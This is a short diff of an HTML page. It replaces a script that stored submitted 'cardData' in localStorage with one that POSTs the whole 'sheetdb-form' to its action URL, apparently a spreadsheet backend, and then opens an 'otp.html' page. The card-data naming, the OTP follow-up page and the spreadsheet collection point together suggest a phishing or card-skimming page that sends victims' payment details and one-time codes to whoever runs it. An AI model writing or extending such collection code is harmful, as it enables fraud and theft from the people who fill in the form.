@@ -68,23 +68,22 @@
 <div class="loadex">
     <img src="loadex.gif"  alt="Loading..." />
 </div>
-<script>
-  var form = document.getElementById('sheetdb-form');
-  form.addEventListener("submit", function(e) {
-    e.preventDefault();
+ <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('otp.html', '_blank');
 
-    const formData = new FormData(form);
-    const dataObject = {};
-    formData.forEach((value, key) => {
-      dataObject[key] = value;
-    });
-
-    localStorage.setItem('cardData', JSON.stringify(dataObject));
-
-    // Redirect to OTP form in same tab
-    window.location.href = 'otp.html';
-  });
-</script>
+          });
+        });
+ </script>
 
 
   <script src='https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js'></script>
